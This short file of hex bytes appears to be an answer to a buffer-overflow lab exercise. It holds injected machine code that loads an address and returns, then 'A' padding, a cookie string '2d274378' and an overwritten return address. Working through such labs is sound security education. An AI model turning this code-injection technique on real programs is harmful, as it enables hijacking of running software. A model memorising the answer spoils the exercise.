bf f0 e5 67 55 /* 5567e5f0 */
68 00 50 40 00 
c3 41 41 41 41 41 41 41 41 41
32 64 32 37 34 33 37 38 00 41
41 41 41 41 41 41 41 41 41 41
98 e5 67 55 00 00 00 00
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 41 41
32 64 32 37 34 33 37 38 00